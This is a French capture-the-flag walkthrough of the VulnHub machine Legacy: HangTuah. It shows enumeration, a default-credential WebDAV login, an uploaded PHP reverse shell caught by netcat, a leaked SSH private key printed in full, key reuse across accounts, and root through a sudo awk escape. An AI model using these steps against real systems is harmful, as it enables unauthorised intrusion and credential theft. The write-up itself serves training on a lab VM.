---
title: "CTF Legacy: HangTuah"
date: 2021-05-06
tags: ["Pentest", "CTF"]
download: https://www.vulnhub.com/entry/legacy-hangtuah,539
---

## Avant propos

Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.  
Ce CTF a été réalisé avec une machine attaquante **Kali 2021.1** (`lsb_release -r`).

## Enumération

On récupère l'adresse IP de la machine distante avec **Netdiscover** `sudo netdiscover`.  
Avant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite `export IP=192.168.1.28`.  
Puis on créé un dossier dédié à ce CTF `cd Documents/ctf && mkdir LegacyHangTuah && cd LegacyHangTuah`.  
On lance **Nmap** pour scanner les ports de la machine distante.

```bash
$ nmap -A -p- $IP -oN nmap.txt
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 eb:69:e0:4f:d0:4e:9e:98:73:9b:fb:67:3a:36:de:21 (RSA)
|   256 17:1c:eb:9e:be:a5:68:25:f1:24:8b:0d:23:5d:9b:c1 (ECDSA)
|_  256 e0:1b:77:26:eb:cb:93:94:b5:f0:04:a3:29:9c:33:c7 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
777/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.1.38
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```

On a un serveur **SSH** sur le port **22**, un serveur **Apache** 2.4.6 sur le port **80** et un serveur **FTP** sur le port **777** On commence donc par énumérer le serveur **FTP** en tant qu'utilisateur anonyme.

```bash
$ ftp 192.168.1.28 777
Connected to 192.168.1.28.
220 (vsFTPd 3.0.3)
Name (192.168.1.28:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 33       33           4096 Aug 21  2020 .
drwxr-xr-x    3 33       33           4096 Aug 21  2020 ..
drwxr-xr-x    3 0        33           4096 Aug 24  2020 .secret
226 Directory send OK.

```

Il y a un dossier ".secret".

```bash
ftp> cd .secret
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        33           4096 Aug 24  2020 .
drwxr-xr-x    3 33       33           4096 Aug 21  2020 ..
drwxr-xr-x    2 0        33           4096 Aug 25  2020 ...
-rw-r--r--    1 0        33             42 Aug 24  2020 notes.txt
```

Ce dernier contient un fichier texte nommé "note.txt".

```bash
ftp> get notes.txt
local: notes.txt remote: notes.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for notes.txt (42 bytes).
226 Transfer complete.
42 bytes received in 0.00 secs (16.4325 kB/s)
ftp> exit
221 Goodbye.
```

Fichier que l'on consulte.

```bash
$ cat notes.txt
N-o-t-h-i-n-g--I-n--H-e-r-e!

M-a-y-b-e??
```

C'est explicite, on est tombé sur une fausse piste. Poursuivons en scannant le serveur **Apache** avec **Nikto** pour avoir un rapport de sécurité.

```bash
$ nikto -h http://$IP -o nikto.txt
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 1 entry which should be manually viewed.
```

Le fichier [robots.txt](http://legacy-hang-thuah.home/robots.txt) indique un nom de domaine.

```txt
User-agent: *
Allow: /

Sitemap: http://legacyhangtuah.com
```

Modifiez le fichier "hosts" pour que l'adresse IP du serveur pointe sur ce nom de domaine.

```bash
$ sudo vim /etc/hosts
192.168.1.28    legacyhangtuah.com
```

Le site est une single page sans rien d'intéressant. Scannons les pages et les fichiers avec **Gobuster**.

```bash
$ gobuster dir -u http://legacyhangtuah.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.xml,.js,.md,.log,.zip
/index.html           (Status: 200) [Size: 35386]
/admin.txt            (Status: 200) [Size: 48]
/assets               (Status: 301) [Size: 325] [--> http://legacyhangtuah.com/assets/]
/css                  (Status: 301) [Size: 322] [--> http://legacyhangtuah.com/css/]
/manual               (Status: 301) [Size: 325] [--> http://legacyhangtuah.com/manual/]
/README.txt           (Status: 200) [Size: 41]
/js                   (Status: 301) [Size: 321] [--> http://legacyhangtuah.com/js/]
/server-status        (Status: 403) [Size: 283]
```

Le fichier [admin.txt](http://legacyhangtuah.com/admin.txt) est une fausse piste.

```txt
Don't forget you are admin so do your job well!
```

Regardons s'il existe des sous domaines sur le **vhost** "legacyhangtuah.com" avec **Gobuster**.

```bash
$ gobuster vhost -u legacyhangtuah.com -w /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt
Found: door.legacyhangtuah.com (Status: 200) [Size: 2062]
```

Effectivement, il existe un sous domaine "door.legacyhangtuah.com". Pour le prendre en compte, modifiez à nouveau le fichier "hosts" pour que l'adresse IP du serveur pointe sur ce sous domaine.

```bash
$ sudo vim /etc/hosts
192.168.1.28    legacyhangtuah.com door.legacyhangtuah.com
```

On fait de nouveau un scan avec **Gobuster** sur ce sous domaine.

```bash
$ gobuster dir -u http://door.legacyhangtuah.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.xml,.js,.md,.log,.zip
/images               (Status: 301) [Size: 335] [--> http://door.legacyhangtuah.com/images/]
/index.php            (Status: 200) [Size: 2062]
/README.md            (Status: 200) [Size: 1998]
/LICENSE              (Status: 200) [Size: 6554]
/webdav               (Status: 401) [Size: 470]
```

[http://door.legacyhangtuah.com/webdav](http://door.legacyhangtuah.com/webdav) est une page protégée mais pas suffisament car "admin:admin" fonctionne. Dans cette page il y a un fichier "passwd.dav" avec ce contenu `admin:$apr1$9tA20Rqw$4qbIQ4QFUV6uUVhfH9NSJ/`.

Mot de passe que l'on peut décoder avec **John the Ripper**.

```bash
$ echo 'admin:$apr1$9tA20Rqw$4qbIQ4QFUV6uUVhfH9NSJ/' >> password.txt
$ john password.txt
admin            (admin)
```

De nouveau, le mot de passe est "admin".

```bash
$ ssh admin@$IP
admin@192.168.1.28's password: admin
```

Non ça ne marche pas, encore une fausse piste. Sur Internet, il s'avère que **WebDAV** est un protocole de **HTTP**. Après des recherche, il est possible d'uploader des fichiers sur ce genre de serveur avec un outil nommé **cadaver** (installé par défaut sur Kali Linux). On s'empresse de préparer un webshell.

```bash
$ cp /usr/share/webshells/php/php-reverse-shell.php .
$ vim php-reverse-shell.php
/$ip
```

Puis dans un nouvel onglet du terminal, on lance un serveur **Netcat** sur le port **1234** `nc -lvp 1234`.

```bash
$ cadaver http://door.legacyhangtuah.com/webdav
Authentication required for webdav on server `door.legacyhangtuah.com':
Username: admin
Password:
dav:/webdav/>
```

Affichons la liste des commandes disponibles.

```bash
dav:/webdav/> help
Available commands:
 ls         cd         pwd        put        get        mget       mput
 edit       less       mkcol      cat        delete     rmcol      copy
 move       lock       unlock     discover   steal      showlocks  version
 checkin    checkout   uncheckout history    label      propnames  chexec
 propget    propdel    propset    search     set        open       close
 echo       quit       unset      lcd        lls        lpwd       logout
 help       describe   about
Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
```

Celle qui nous intréresse est `put`.

```bash
dav:/webdav/> put php-reverse-shell.php
Uploading php-reverse-shell.php to `/webdav/php-reverse-shell.php':
Progress: [=============================>] 100,0% of 5494 bytes succeeded.
```

Si on rafraichit le répertoire [http://door.legacyhangtuah.com/webdav](http://door.legacyhangtuah.com/webdav), le reverse shell apparait dans la liste des fichiers que l'on exécute en cliquant dessus.

## Pénétration

Dans l'autre onglet du terminal, la connexion au serveur est établi.

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

On peut ouvrir un fichier dans le dossier "/home".

```bash
$ cat /home/pendekar/send_letter.txt
23595 Gold for you!!
```

On retourne dans le dossier de l'utilsateur "www-data".

```bash
$ cd /var/www && ls -la
-rw-------  1 www-data www-data 6378 Aug 25  2020 .bash_history
drwx------  2 www-data www-data 4096 May  3 17:49 .gnupg
drwxrwxrwx  3 www-data www-data 4096 Aug 24  2020 .local
-rw-rw-rw-  1 www-data www-data  180 May  3 17:47 .wget-hsts
drwxr-xr-x  3 www-data www-data 4096 Aug 21  2020 chest
drwxr-xr-x  3 www-data www-data 4096 Aug 24  2020 door.legacyhangtuah.com
drwxr-xr-x  2 www-data www-data 4096 Aug 24  2020 html
drwxr-xr-x  3 www-data www-data 4096 Aug 24  2020 legacyhangtuah.com
drwxr-xr-x  3 www-data www-data 4096 May  3 17:49 snap
```

Il y a des choses intéressantes dans le fichier d'historique ".bash_history".

```bash
$ cat .bash_history
cd /opt
ls -la
cd pendekar/
# [plein de lignes]
echo '/home/pendekar/.ssh/id_rsa' > official_letter.txt
cat official_letter.txt
```

On essaie de reproduire cette commmande.

```bash
$ cd /opt/pendekar/
$ echo '/home/pendekar/.ssh/id_rsa' > official_letter.txt
< '/home/pendekar/.ssh/id_rsa' > official_letter.txt
$ cat official_letter.txt
/home/pendekar/.ssh/id_rsa
```

Et si on retourne dans le seul fichier que l'on a pu ouvrir.

```bash
$ cat /home/pendekar/send_letter.txt
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

On obtient la clef de l'utilisateur "pendekar" que l'on stocke dans un fichier nommé "pem" sur la machine attaquante.

```bash
$ echo 'contenu de la clef' > pem
$ chmod 666
$ ssh -i pem pendekar@$IP
$ id
uid=1001(pendekar) gid=1001(pendekar) groups=1001(pendekar)
```

On trouve le flag user dans le répertoire de l'utilisateur ("/home/pendekar").

```bash
$ cat user.txt
1970fa17c52fdf2ff1d5da9af96733b2
```

Puis un fichier d'instruction dans le répertoire de l'autre utilisateur "hangtuah".

```bash
$ cd /home/hangtuah
$ cat lastnotes.txt
I have been waiting for you pendekar.. I do not have enough time.
Many people looking for me there is no more hope for me in here.
I know you are the best one to secure this palace instead of me.
I need to go now somewhere very far and I hope we will meet soon...

..
--. .. ...- .
-.-- --- ..-
.--. . .-. -- .. ... ... .. --- -.
.- .-.. .-. . .- -.. -.-- .-.-.- .-.-.- .-.-.-
- .... .
.-..-. -.- . -.-- .-..-. .-.-.- .-.-.- .-.-.-
-.-- --- ..-
-.- -. --- .--
.-- .... .- -
..
-- . .- -.
-... . -.-. .- ..- ... .
-.-- --- ..-
.- .-. .
.--. . -. -.. . -.- .- .-. -.-.--

-....-
.... .- -. --. - ..- .- ....
```

La seconde partie ressemble à du langage morse. Sur le site [https://www.dcode.fr](https://www.dcode.fr/code-morse) avec l'option cochée "Prendre pour court et long ces deux caractères", on trouve `IGIVEYOUPERMISSIONALREADY...THE"KEY"...YOUKNOWWHATIMEANBECAUSEYOUAREPENDEKAR!-HANGTUAH`.

Apparement, la clef existante fonctionnerait avec l'autre compte, celui de "hangtuah". On se déconnecte de la session **SSH**.

```bash
$ exit
logout
Connection to 192.168.1.28 closed.
```

Pour se connecter avec le nouveau compte.

```bash
$ ssh -i pem hangtuah@$IP
$ whoami
hangtuah
```

## Escalation

Regardons les privilèges de cet utilisateur.

```bash
$ sudo -l
User hangtuah may run the following commands on legacyhangtuah:
    (root) NOPASSWD: /usr/bin/awk
```

Sur [GTOBins](https://gtfobins.github.io/gtfobins/awk/#sudo), on trouve la commande `awk` pour devenir root.

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
$ whoami
root
```

Désormais utilisateur "root", on trouve facilement le flag root.

```bash
$ cat /root/root.txt
8840d1ea10bfc55b0e2dd2354524d779
```

## Sources

- Le protocole WebDAV [https://fr.wikipedia.org/wiki/WebDAV](https://fr.wikipedia.org/wiki/WebDAV) ;
- Comment exploiter WebDAV [https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718](https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718).
